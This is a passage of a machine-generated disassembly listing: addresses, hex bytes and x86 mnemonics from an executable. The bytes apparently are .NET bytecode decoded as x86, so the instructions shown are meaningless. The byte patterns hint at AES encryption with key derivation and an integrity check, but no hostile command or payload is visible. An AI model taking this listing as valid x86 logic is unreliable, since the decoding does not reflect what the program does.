  40516a:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  405170:	28 f2                	sub    %dh,%dl
  405172:	00 00                	add    %al,(%eax)
  405174:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40517a:	28 f2                	sub    %dh,%dl
  40517c:	00 00                	add    %al,(%eax)
  40517e:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  405184:	28 f2                	sub    %dh,%dl
  405186:	00 00                	add    %al,(%eax)
  405188:	0a a2 28 f3 00 00    	or     0xf328(%edx),%ah
  40518e:	0a 28                	or     (%eax),%ch
  405190:	f4                   	hlt
  405191:	00 00                	add    %al,(%eax)
  405193:	0a 80 3c 00 00 04    	or     0x400003c(%eax),%al
  405199:	7e 3c                	jle    0x4051d7
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 7b                	add    $0x7b,%al
  40519f:	f5                   	cmc
  4051a0:	00 00                	add    %al,(%eax)
  4051a2:	0a 7e 3c             	or     0x3c(%esi),%bh
  4051a5:	00 00                	add    %al,(%eax)
  4051a7:	04 06                	add    $0x6,%al
  4051a9:	28 06                	sub    %al,(%esi)
  4051ab:	00 00                	add    %al,(%eax)
  4051ad:	06                   	push   %es
  4051ae:	7e 0b                	jle    0x4051bb
  4051b0:	00 00                	add    %al,(%eax)
  4051b2:	04 7e                	add    $0x7e,%al
  4051b4:	10 00                	adc    %al,(%eax)
  4051b6:	00 04 02             	add    %al,(%edx,%eax,1)
  4051b9:	72 9f                	jb     0x40515a
  4051bb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4051bf:	4d                   	dec    %ebp
  4051c0:	00 00                	add    %al,(%eax)
  4051c2:	06                   	push   %es
  4051c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c4:	48                   	dec    %eax
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	06                   	push   %es
  4051c8:	7e 39                	jle    0x405203
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	04 7e                	add    $0x7e,%al
  4051ce:	08 00                	or     %al,(%eax)
  4051d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4051d3:	0f 00 00             	sldt   (%eax)
  4051d6:	04 7e                	add    $0x7e,%al
  4051d8:	04 00                	add    $0x0,%al
  4051da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4051dd:	f6 00 00             	testb  $0x0,(%eax)
  4051e0:	0a 28                	or     (%eax),%ch
  4051e2:	94                   	xchg   %eax,%esp
  4051e3:	00 00                	add    %al,(%eax)
  4051e5:	06                   	push   %es
  4051e6:	2a 00                	sub    (%eax),%al
  4051e8:	1b 30                	sbb    (%eax),%esi
  4051ea:	03 00                	add    (%eax),%eax
  4051ec:	53                   	push   %ebx
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 27                	add    %ah,(%edi)
  4051f1:	00 00                	add    %al,(%eax)
  4051f3:	11 02                	adc    %eax,(%edx)
  4051f5:	28 1a                	sub    %bl,(%edx)
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	0a 03                	or     (%ebx),%al
  4051fb:	28 f7                	sub    %dh,%bh
  4051fd:	00 00                	add    %al,(%eax)
  4051ff:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  405202:	72 cd                	jb     0x4051d1
  405204:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  405208:	f8                   	clc
  405209:	00 00                	add    %al,(%eax)
  40520b:	0a 7a 03             	or     0x3(%edx),%bh
  40520e:	7e 43                	jle    0x405253
  405210:	00 00                	add    %al,(%eax)
  405212:	04 20                	add    $0x20,%al
  405214:	50                   	push   %eax
  405215:	c3                   	ret
  405216:	00 00                	add    %al,(%eax)
  405218:	73 f9                	jae    0x405213
  40521a:	00 00                	add    %al,(%eax)
  40521c:	0a 0a                	or     (%edx),%cl
  40521e:	02 06                	add    (%esi),%al
  405220:	1f                   	pop    %ds
  405221:	20 6f fa             	and    %ch,-0x6(%edi)
  405224:	00 00                	add    %al,(%eax)
  405226:	0a 7d 41             	or     0x41(%ebp),%bh
  405229:	00 00                	add    %al,(%eax)
  40522b:	04 02                	add    $0x2,%al
  40522d:	06                   	push   %es
  40522e:	1f                   	pop    %ds
  40522f:	40                   	inc    %eax
  405230:	6f                   	outsl  %ds:(%esi),(%dx)
  405231:	fa                   	cli
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 7d 42             	or     0x42(%ebp),%bh
  405237:	00 00                	add    %al,(%eax)
  405239:	04 de                	add    $0xde,%al
  40523b:	0a 06                	or     (%esi),%al
  40523d:	2c 06                	sub    $0x6,%al
  40523f:	06                   	push   %es
  405240:	6f                   	outsl  %ds:(%esi),(%dx)
  405241:	33 00                	xor    (%eax),%eax
  405243:	00 0a                	add    %cl,(%edx)
  405245:	dc 2a                	fsubrl (%edx)
  405247:	00 01                	add    %al,(%ecx)
  405249:	10 00                	adc    %al,(%eax)
  40524b:	00 02                	add    %al,(%edx)
  40524d:	00 2a                	add    %ch,(%edx)
  40524f:	00 1e                	add    %bl,(%esi)
  405251:	48                   	dec    %eax
  405252:	00 0a                	add    %cl,(%edx)
  405254:	00 00                	add    %al,(%eax)
  405256:	00 00                	add    %al,(%eax)
  405258:	1b 30                	sbb    (%eax),%esi
  40525a:	05 00 00 01 00       	add    $0x10000,%eax
  40525f:	00 28                	add    %ch,(%eax)
  405261:	00 00                	add    %al,(%eax)
  405263:	11 03                	adc    %eax,(%ebx)
  405265:	2d 0b 72 15 27       	sub    $0x2715720b,%eax
  40526a:	00 70 73             	add    %dh,0x73(%eax)
  40526d:	fc                   	cld
  40526e:	00 00                	add    %al,(%eax)
  405270:	0a 7a 73             	or     0x73(%edx),%bh
  405273:	79 00                	jns    0x405275
  405275:	00 0a                	add    %cl,(%edx)
  405277:	0a 06                	or     (%esi),%al
  405279:	1f                   	pop    %ds
  40527a:	20 6a 6f             	and    %ch,0x6f(%edx)
  40527d:	4e                   	dec    %esi
  40527e:	00 00                	add    %al,(%eax)
  405280:	0a 73 fd             	or     -0x3(%ebx),%dh
  405283:	00 00                	add    %al,(%eax)
  405285:	0a 0b                	or     (%ebx),%cl
  405287:	07                   	pop    %es
  405288:	20 00                	and    %al,(%eax)
  40528a:	01 00                	add    %eax,(%eax)
  40528c:	00 6f fe             	add    %ch,-0x2(%edi)
  40528f:	00 00                	add    %al,(%eax)
  405291:	0a 07                	or     (%edi),%al
  405293:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  405299:	ff 00                	incl   (%eax)
  40529b:	00 0a                	add    %cl,(%edx)
  40529d:	07                   	pop    %es
  40529e:	17                   	pop    %ss
  40529f:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a0:	00 01                	add    %al,(%ecx)
  4052a2:	00 0a                	add    %cl,(%edx)
  4052a4:	07                   	pop    %es
  4052a5:	18 6f 01             	sbb    %ch,0x1(%edi)
  4052a8:	01 00                	add    %eax,(%eax)
  4052aa:	0a 07                	or     (%edi),%al
  4052ac:	02 7b 41             	add    0x41(%ebx),%bh
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	04 6f                	add    $0x6f,%al
  4052b3:	02 01                	add    (%ecx),%al
  4052b5:	00 0a                	add    %cl,(%edx)
  4052b7:	07                   	pop    %es
  4052b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b9:	03 01                	add    (%ecx),%eax
  4052bb:	00 0a                	add    %cl,(%edx)
  4052bd:	06                   	push   %es
  4052be:	07                   	pop    %es
  4052bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c0:	04 01                	add    $0x1,%al
  4052c2:	00 0a                	add    %cl,(%edx)
  4052c4:	17                   	pop    %ss
  4052c5:	73 05                	jae    0x4052cc
  4052c7:	01 00                	add    %eax,(%eax)
  4052c9:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4052cc:	07                   	pop    %es
  4052cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4052ce:	06                   	push   %es
  4052cf:	01 00                	add    %eax,(%eax)
  4052d1:	0a 16                	or     (%esi),%dl
  4052d3:	07                   	pop    %es
  4052d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d5:	06                   	push   %es
  4052d6:	01 00                	add    %eax,(%eax)
  4052d8:	0a 8e 69 6f 4c 00    	or     0x4c6f69(%esi),%cl
  4052de:	00 0a                	add    %cl,(%edx)
  4052e0:	08 03                	or     %al,(%ebx)
  4052e2:	16                   	push   %ss
  4052e3:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4052e9:	00 0a                	add    %cl,(%edx)
  4052eb:	08 6f 07             	or     %ch,0x7(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 02                	or     (%edx),%al
  4052f2:	7b 42                	jnp    0x405336
  4052f4:	00 00                	add    %al,(%eax)
  4052f6:	04 73                	add    $0x73,%al
  4052f8:	08 01                	or     %al,(%ecx)
  4052fa:	00 0a                	add    %cl,(%edx)
  4052fc:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  405301:	01 00                	add    %eax,(%eax)
  405303:	0a 1f                	or     (%edi),%bl
  405305:	20 06                	and    %al,(%esi)
  405307:	6f                   	outsl  %ds:(%esi),(%dx)
  405308:	09 01                	or     %eax,(%ecx)
  40530a:	00 0a                	add    %cl,(%edx)
  40530c:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40530f:	20 59 6f             	and    %bl,0x6f(%ecx)
  405312:	0a 01                	or     (%ecx),%al
  405314:	00 0a                	add    %cl,(%edx)
  405316:	13 04 06             	adc    (%esi,%eax,1),%eax
  405319:	16                   	push   %ss
  40531a:	6a 6f                	push   $0x6f
  40531c:	4e                   	dec    %esi
  40531d:	00 00                	add    %al,(%eax)
  40531f:	0a 06                	or     (%esi),%al
  405321:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405324:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405327:	69 6f 4c 00 00 0a de 	imul   $0xde0a0000,0x4c(%edi),%ebp
  40532e:	1e                   	push   %ds
  40532f:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  405332:	09 6f 33             	or     %ebp,0x33(%edi)
  405335:	00 00                	add    %al,(%eax)
  405337:	0a dc                	or     %ah,%bl
  405339:	08 2c 06             	or     %ch,(%esi,%eax,1)
  40533c:	08 6f 33             	or     %ch,0x33(%edi)
  40533f:	00 00                	add    %al,(%eax)
  405341:	0a dc                	or     %ah,%bl
  405343:	07                   	pop    %es
  405344:	2c 06                	sub    $0x6,%al
  405346:	07                   	pop    %es
  405347:	6f                   	outsl  %ds:(%esi),(%dx)
  405348:	33 00                	xor    (%eax),%eax
  40534a:	00 0a                	add    %cl,(%edx)
  40534c:	dc 06                	faddl  (%esi)
  40534e:	6f                   	outsl  %ds:(%esi),(%dx)
  40534f:	09 01                	or     %eax,(%ecx)
  405351:	00 0a                	add    %cl,(%edx)
  405353:	13 05 de 0a 06 2c    	adc    0x2c060ade,%eax
  405359:	06                   	push   %es
  40535a:	06                   	push   %es
  40535b:	6f                   	outsl  %ds:(%esi),(%dx)
  40535c:	33 00                	xor    (%eax),%eax
  40535e:	00 0a                	add    %cl,(%edx)
  405360:	dc 11                	fcoml  (%ecx)
  405362:	05 2a 01 34 00       	add    $0x34012a,%eax
  405367:	00 02                	add    %al,(%edx)
  405369:	00 99 00 32 cb 00    	add    %bl,0xcb3200(%ecx)
  40536f:	0a 00                	or     (%eax),%al
  405371:	00 00                	add    %al,(%eax)
  405373:	00 02                	add    %al,(%edx)
  405375:	00 67 00             	add    %ah,0x0(%edi)
  405378:	6e                   	outsb  %ds:(%esi),(%dx)
  405379:	d5 00                	aad    $0x0
  40537b:	0a 00                	or     (%eax),%al
  40537d:	00 00                	add    %al,(%eax)
  40537f:	00 02                	add    %al,(%edx)
  405381:	00 23                	add    %ah,(%ebx)
  405383:	00 bc df 00 0a 00 00 	add    %bh,0xa00(%edi,%ebx,8)
  40538a:	00 00                	add    %al,(%eax)
  40538c:	02 00                	add    (%eax),%al
  40538e:	14 00                	adc    $0x0,%al
  405390:	df f3                	fcomip %st(3),%st
  405392:	00 0a                	add    %cl,(%edx)
  405394:	00 00                	add    %al,(%eax)
  405396:	00 00                	add    %al,(%eax)
  405398:	1b 30                	sbb    (%eax),%esi
  40539a:	05 00 37 01 00       	add    $0x13700,%eax
  40539f:	00 29                	add    %ch,(%ecx)
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	11 03                	adc    %eax,(%ebx)
  4053a5:	2d 0b 72 15 27       	sub    $0x2715720b,%eax
  4053aa:	00 70 73             	add    %dh,0x73(%eax)
  4053ad:	fc                   	cld
  4053ae:	00 00                	add    %al,(%eax)
  4053b0:	0a 7a 03             	or     0x3(%edx),%bh
  4053b3:	73 4d                	jae    0x405402
  4053b5:	00 00                	add    %al,(%eax)
  4053b7:	0a 0a                	or     (%edx),%cl
  4053b9:	73 fd                	jae    0x4053b8
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	0a 0b                	or     (%ebx),%cl
  4053bf:	07                   	pop    %es
  4053c0:	20 00                	and    %al,(%eax)
  4053c2:	01 00                	add    %eax,(%eax)
  4053c4:	00 6f fe             	add    %ch,-0x2(%edi)
  4053c7:	00 00                	add    %al,(%eax)
  4053c9:	0a 07                	or     (%edi),%al
  4053cb:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4053d1:	ff 00                	incl   (%eax)
  4053d3:	00 0a                	add    %cl,(%edx)
  4053d5:	07                   	pop    %es
  4053d6:	17                   	pop    %ss
  4053d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053d8:	00 01                	add    %al,(%ecx)
  4053da:	00 0a                	add    %cl,(%edx)
  4053dc:	07                   	pop    %es
  4053dd:	18 6f 01             	sbb    %ch,0x1(%edi)
  4053e0:	01 00                	add    %eax,(%eax)
  4053e2:	0a 07                	or     (%edi),%al
  4053e4:	02 7b 41             	add    0x41(%ebx),%bh
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	04 6f                	add    $0x6f,%al
  4053eb:	02 01                	add    (%ecx),%al
  4053ed:	00 0a                	add    %cl,(%edx)
  4053ef:	02 7b 42             	add    0x42(%ebx),%bh
  4053f2:	00 00                	add    %al,(%eax)
  4053f4:	04 73                	add    $0x73,%al
  4053f6:	08 01                	or     %al,(%ecx)
  4053f8:	00 0a                	add    %cl,(%edx)
  4053fa:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4053ff:	01 00                	add    %eax,(%eax)
  405401:	0a 1f                	or     (%edi),%bl
  405403:	20 06                	and    %al,(%esi)
  405405:	6f                   	outsl  %ds:(%esi),(%dx)
  405406:	09 01                	or     %eax,(%ecx)
  405408:	00 0a                	add    %cl,(%edx)
  40540a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40540d:	20 59 6f             	and    %bl,0x6f(%ecx)
  405410:	0a 01                	or     (%ecx),%al
  405412:	00 0a                	add    %cl,(%edx)
  405414:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405417:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40541d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  405423:	11 05 8e 69 6f 45    	adc    %eax,0x456f698e
  405429:	00 00                	add    %al,(%eax)
  40542b:	0a 26                	or     (%esi),%ah
  40542d:	02 11                	add    (%ecx),%dl
  40542f:	04 11                	add    $0x11,%al
  405431:	05 28 9c 00 00       	add    $0x9c28,%eax
  405436:	06                   	push   %es
  405437:	2d 0b 72 43 27       	sub    $0x2743720b,%eax
  40543c:	00 70 73             	add    %dh,0x73(%eax)
  40543f:	0b 01                	or     (%ecx),%eax
  405441:	00 0a                	add    %cl,(%edx)
  405443:	7a de                	jp     0x405423
  405445:	0a 09                	or     (%ecx),%cl
  405447:	2c 06                	sub    $0x6,%al
  405449:	09 6f 33             	or     %ebp,0x33(%edi)
  40544c:	00 00                	add    %al,(%eax)
  40544e:	0a dc                	or     %ah,%bl
  405450:	1f                   	pop    %ds
  405451:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  405457:	0c 06                	or     $0x6,%al
  405459:	08 16                	or     %dl,(%esi)
  40545b:	1f                   	pop    %ds
  40545c:	10 6f 45             	adc    %ch,0x45(%edi)
  40545f:	00 00                	add    %al,(%eax)
  405461:	0a 26                	or     (%esi),%ah
  405463:	07                   	pop    %es
  405464:	08 6f 0c             	or     %ch,0xc(%edi)
  405467:	01 00                	add    %eax,(%eax)
  405469:	0a 06                	or     (%esi),%al
  40546b:	07                   	pop    %es
  40546c:	6f                   	outsl  %ds:(%esi),(%dx)
  40546d:	0d 01 00 0a 16       	or     $0x160a0001,%eax
  405472:	73 05                	jae    0x405479
  405474:	01 00                	add    %eax,(%eax)
  405476:	0a 13                	or     (%ebx),%dl
  405478:	06                   	push   %es
  405479:	06                   	push   %es
  40547a:	6f                   	outsl  %ds:(%esi),(%dx)
  40547b:	75 00                	jne    0x40547d
  40547d:	00 0a                	add    %cl,(%edx)
  40547f:	1f                   	pop    %ds
  405480:	10 6a 59             	adc    %ch,0x59(%edx)
  405483:	17                   	pop    %ss
  405484:	6a 58                	push   $0x58
  405486:	d4 8d                	aam    $0x8d
  405488:	44                   	inc    %esp
  405489:	00 00                	add    %al,(%eax)
  40548b:	01 13                	add    %edx,(%ebx)
  40548d:	07                   	pop    %es
  40548e:	11 06                	adc    %eax,(%esi)
  405490:	11 07                	adc    %eax,(%edi)
  405492:	16                   	push   %ss
  405493:	11 07                	adc    %eax,(%edi)
  405495:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405498:	45                   	inc    %ebp
  405499:	00 00                	add    %al,(%eax)
  40549b:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4054a1:	13 08                	adc    (%eax),%ecx
  4054a3:	11 07                	adc    %eax,(%edi)
  4054a5:	16                   	push   %ss
  4054a6:	11 08                	adc    %ecx,(%eax)
  4054a8:	16                   	push   %ss
  4054a9:	11 08                	adc    %ecx,(%eax)
  4054ab:	8e 69 28             	mov    0x28(%ecx),%gs
  4054ae:	0e                   	push   %cs
  4054af:	01 00                	add    %eax,(%eax)
  4054b1:	0a 11                	or     (%ecx),%dl
  4054b3:	08 13                	or     %dl,(%ebx)
  4054b5:	09 de                	or     %ebx,%esi
  4054b7:	20 11                	and    %dl,(%ecx)
  4054b9:	06                   	push   %es
  4054ba:	2c 07                	sub    $0x7,%al
  4054bc:	11 06                	adc    %eax,(%esi)
  4054be:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bf:	33 00                	xor    (%eax),%eax
  4054c1:	00 0a                	add    %cl,(%edx)
  4054c3:	dc 07                	faddl  (%edi)
  4054c5:	2c 06                	sub    $0x6,%al
  4054c7:	07                   	pop    %es
  4054c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c9:	33 00                	xor    (%eax),%eax
  4054cb:	00 0a                	add    %cl,(%edx)
  4054cd:	dc 06                	faddl  (%esi)
  4054cf:	2c 06                	sub    $0x6,%al
  4054d1:	06                   	push   %es
  4054d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d3:	33 00                	xor    (%eax),%eax
  4054d5:	00 0a                	add    %cl,(%edx)
  4054d7:	dc 11                	fcoml  (%ecx)
  4054d9:	09 2a                	or     %ebp,(%edx)
  4054db:	00 41 64             	add    %al,0x64(%ecx)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	02 00                	add    (%eax),%al
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	57                   	push   %edi
  4054e5:	00 00                	add    %al,(%eax)
  4054e7:	00 4b 00             	add    %cl,0x0(%ebx)
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	a2 00 00 00 0a       	mov    %al,0xa000000
  4054f1:	00 00                	add    %al,(%eax)
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	00 02                	add    %al,(%edx)
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 d5                	add    %dl,%ch
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 3f                	add    %bh,(%edi)
  405501:	00 00                	add    %al,(%eax)
  405503:	00 14 01             	add    %dl,(%ecx,%eax,1)
  405506:	00 00                	add    %al,(%eax)
  405508:	0c 00                	or     $0x0,%al
  40550a:	00 00                	add    %al,(%eax)
  40550c:	00 00                	add    %al,(%eax)
  40550e:	00 00                	add    %al,(%eax)
  405510:	02 00                	add    (%eax),%al
  405512:	00 00                	add    %al,(%eax)
  405514:	1b 00                	sbb    (%eax),%eax
  405516:	00 00                	add    %al,(%eax)
  405518:	05 01 00 00 20       	add    $0x20000001,%eax
  40551d:	01 00                	add    %eax,(%eax)
  40551f:	00 0a                	add    %cl,(%edx)
  405521:	00 00                	add    %al,(%eax)
  405523:	00 00                	add    %al,(%eax)
  405525:	00 00                	add    %al,(%eax)
  405527:	00 02                	add    %al,(%edx)
  405529:	00 00                	add    %al,(%eax)
  40552b:	00 15 00 00 00 15    	add    %dl,0x15000000
  405531:	01 00                	add    %eax,(%eax)
  405533:	00 2a                	add    %ch,(%edx)
  405535:	01 00                	add    %eax,(%eax)
  405537:	00 0a                	add    %cl,(%edx)
  405539:	00 00                	add    %al,(%eax)
  40553b:	00 00                	add    %al,(%eax)
  40553d:	00 00                	add    %al,(%eax)
  40553f:	00 13                	add    %dl,(%ebx)
  405541:	30 03                	xor    %al,(%ebx)
  405543:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405546:	00 00                	add    %al,(%eax)
  405548:	2a 00                	sub    (%eax),%al
  40554a:	00 11                	add    %dl,(%ecx)
  40554c:	17                   	pop    %ss
  40554d:	0a 16                	or     (%esi),%dl
  40554f:	0b 2b                	or     (%ebx),%ebp
  405551:	0e                   	push   %cs
  405552:	03 07                	add    (%edi),%eax
  405554:	91                   	xchg   %eax,%ecx
  405555:	04 07                	add    $0x7,%al
  405557:	91                   	xchg   %eax,%ecx
  405558:	2e 02 16             	add    %cs:(%esi),%dl
  40555b:	0a 07                	or     (%edi),%al
  40555d:	17                   	pop    %ss
  40555e:	58                   	pop    %eax
  40555f:	0b 07                	or     (%edi),%eax
  405561:	03 8e 69 32 ec 06    	add    0x6ec3269(%esi),%ecx
  405567:	2a 1b                	sub    (%ebx),%bl
  405569:	30 03                	xor    %al,(%ebx)
  40556b:	00 65 00             	add    %ah,0x0(%ebp)
  40556e:	00 00                	add    %al,(%eax)
  405570:	2b 00                	sub    (%eax),%eax
  405572:	00 11                	add    %dl,(%ecx)
  405574:	28 1b                	sub    %bl,(%ebx)
  405576:	00 00                	add    %al,(%eax)
  405578:	0a 02                	or     (%edx),%al
  40557a:	6f                   	outsl  %ds:(%esi),(%dx)
  40557b:	21 00                	and    %eax,(%eax)
  40557d:	00 0a                	add    %cl,(%edx)
  40557f:	0a 73 0f             	or     0xf(%ebx),%dh
  405582:	01 00                	add    %eax,(%eax)
  405584:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405587:	06                   	push   %es
  405588:	6f                   	outsl  %ds:(%esi),(%dx)
  405589:	c5 00                	lds    (%eax),%eax
  40558b:	00 0a                	add    %cl,(%edx)
  40558d:	0a de                	or     %dh,%bl
  40558f:	0a 08                	or     (%eax),%cl
  405591:	2c 06                	sub    $0x6,%al
  405593:	08 6f 33             	or     %ch,0x33(%edi)
  405596:	00 00                	add    %al,(%eax)
  405598:	0a dc                	or     %ah,%bl
  40559a:	73 53                	jae    0x4055ef
  40559c:	00 00                	add    %al,(%eax)
  40559e:	0a 0b                	or     (%ebx),%cl
  4055a0:	06                   	push   %es
  4055a1:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4055a6:	1f                   	pop    %ds
  4055a7:	09 11                	or     %edx,(%ecx)
  4055a9:	04 91                	add    $0x91,%al
  4055ab:	13 05 07 12 05 72    	adc    0x72051207,%eax
  4055b1:	99                   	cltd
  4055b2:	27                   	daa
  4055b3:	00 70 28             	add    %dh,0x28(%eax)
  4055b6:	c6 00 00             	movb   $0x0,(%eax)
  4055b9:	0a 6f 55             	or     0x55(%edi),%ch
  4055bc:	00 00                	add    %al,(%eax)
  4055be:	0a 26                	or     (%esi),%ah
  4055c0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4055c3:	58                   	pop    %eax
  4055c4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4055c7:	04 09                	add    $0x9,%al
  4055c9:	8e 69 32             	mov    0x32(%ecx),%gs
  4055cc:	da 07                	fiaddl (%edi)
  4055ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4055cf:	38 00                	cmp    %al,(%eax)
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4055d4:	c8 00 00 0a          	enter  $0x0,$0xa
  4055d8:	2a 00                	sub    (%eax),%al
  4055da:	00 00                	add    %al,(%eax)
  4055dc:	01 10                	add    %edx,(%eax)
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	02 00                	add    (%eax),%al
  4055e2:	12 00                	adc    (%eax),%al
  4055e4:	0a 1c 00             	or     (%eax,%eax,1),%bl
  4055e7:	0a 00                	or     (%eax),%al
  4055e9:	00 00                	add    %al,(%eax)
  4055eb:	00 1b                	add    %bl,(%ebx)
  4055ed:	30 02                	xor    %al,(%edx)
  4055ef:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	2c 00                	sub    $0x0,%al
  4055f6:	00 11                	add    %dl,(%ecx)
  4055f8:	73 0f                	jae    0x405609
  4055fa:	01 00                	add    %eax,(%eax)
  4055fc:	0a 0a                	or     (%edx),%cl
  4055fe:	06                   	push   %es
  4055ff:	02 6f c5             	add    -0x3b(%edi),%ch
  405602:	00 00                	add    %al,(%eax)
  405604:	0a 0b                	or     (%ebx),%cl
  405606:	de 0a                	fimuls (%edx)
  405608:	06                   	push   %es
  405609:	2c 06                	sub    $0x6,%al
  40560b:	06                   	push   %es
  40560c:	6f                   	outsl  %ds:(%esi),(%dx)
  40560d:	33 00                	xor    (%eax),%eax
  40560f:	00 0a                	add    %cl,(%edx)
  405611:	dc 07                	faddl  (%edi)
  405613:	2a 01                	sub    (%ecx),%al
  405615:	10 00                	adc    %al,(%eax)
  405617:	00 02                	add    %al,(%edx)
  405619:	00 06                	add    %al,(%esi)
  40561b:	00 0a                	add    %cl,(%edx)
  40561d:	10 00                	adc    %al,(%eax)
  40561f:	0a 00                	or     (%eax),%al
  405621:	00 00                	add    %al,(%eax)
  405623:	00 1b                	add    %bl,(%ebx)
  405625:	30 04 00             	xor    %al,(%eax,%eax,1)
  405628:	58                   	pop    %eax
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405631:	73 4d                	jae    0x405680
  405633:	00 00                	add    %al,(%eax)
  405635:	0a 0a                	or     (%edx),%cl
  405637:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  40563d:	0b 06                	or     (%esi),%eax
  40563f:	07                   	pop    %es
  405640:	16                   	push   %ss
  405641:	1a 6f 45             	sbb    0x45(%edi),%ch
  405644:	00 00                	add    %al,(%eax)
  405646:	0a 26                	or     (%esi),%ah
  405648:	07                   	pop    %es
  405649:	16                   	push   %ss
  40564a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40564e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405651:	16                   	push   %ss
  405652:	73 10                	jae    0x405664
  405654:	01 00                	add    %eax,(%eax)
  405656:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  40565c:	00 01                	add    %al,(%ecx)
  40565e:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405661:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405664:	08 6f 45             	or     %ch,0x45(%edi)
  405667:	00 00                	add    %al,(%eax)
  405669:	0a 26                	or     (%esi),%ah
  40566b:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40566e:	05 de 14 09 2c       	add    $0x2c0914de,%eax
  405673:	06                   	push   %es
  405674:	09 6f 33             	or     %ebp,0x33(%edi)
  405677:	00 00                	add    %al,(%eax)
  405679:	0a dc                	or     %ah,%bl
  40567b:	06                   	push   %es
  40567c:	2c 06                	sub    $0x6,%al
  40567e:	06                   	push   %es
  40567f:	6f                   	outsl  %ds:(%esi),(%dx)
  405680:	33 00                	xor    (%eax),%eax
  405682:	00 0a                	add    %cl,(%edx)
  405684:	dc 11                	fcoml  (%ecx)
  405686:	05 2a 01 1c 00       	add    $0x1c012a,%eax
  40568b:	00 02                	add    %al,(%edx)
  40568d:	00 28                	add    %ch,(%eax)
  40568f:	00 19                	add    %bl,(%ecx)
  405691:	41                   	inc    %ecx
  405692:	00 0a                	add    %cl,(%edx)
  405694:	00 00                	add    %al,(%eax)
  405696:	00 00                	add    %al,(%eax)
  405698:	02 00                	add    (%eax),%al
  40569a:	07                   	pop    %es
  40569b:	00 44 4b 00          	add    %al,0x0(%ebx,%ecx,2)
  40569f:	0a 00                	or     (%eax),%al
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 1b                	add    %bl,(%ebx)
  4056a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056a8:	52                   	push   %edx
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	00 2e                	add    %ch,(%esi)
  4056ad:	00 00                	add    %al,(%eax)
  4056af:	11 73 79             	adc    %esi,0x79(%ebx)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	0a 0a                	or     (%edx),%cl
  4056b6:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  4056bc:	00 0a                	add    %cl,(%edx)
  4056be:	0b 06                	or     (%esi),%eax
  4056c0:	07                   	pop    %es
  4056c1:	16                   	push   %ss
